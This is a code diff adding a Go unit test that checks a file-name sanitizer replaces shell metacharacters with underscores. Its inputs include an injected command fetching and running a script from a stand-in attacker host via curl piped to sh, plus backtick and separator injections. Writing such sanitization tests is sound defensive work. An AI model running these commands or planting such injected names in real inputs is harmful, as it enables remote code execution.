@@ -527,3 +527,16 @@ func TestSharedFileName(t *testing.T) {
 		}
 	}
 }
+
+func TestSharedFileNameDefusesShellCharacters(t *testing.T) {
+	for name, want := range map[string]string{
+		"notes$(curl -s evil.example|sh).md": "notes__curl -s evil.example_sh_.md",
+		"a`id`;b&c>d<e.md":                   "a_id__b_c_d_e.md",
+		"notes (1).md":                       "notes _1_.md",
+		"Q[1] #2, 50%.md":                    "Q[1] #2, 50%.md",
+	} {
+		if got, ok := sharedFileName(map[string]any{"file": name}); !ok || got != want {
+			t.Errorf("%q = %q, %v; want %q", name, got, ok, want)
+		}
+	}
+}
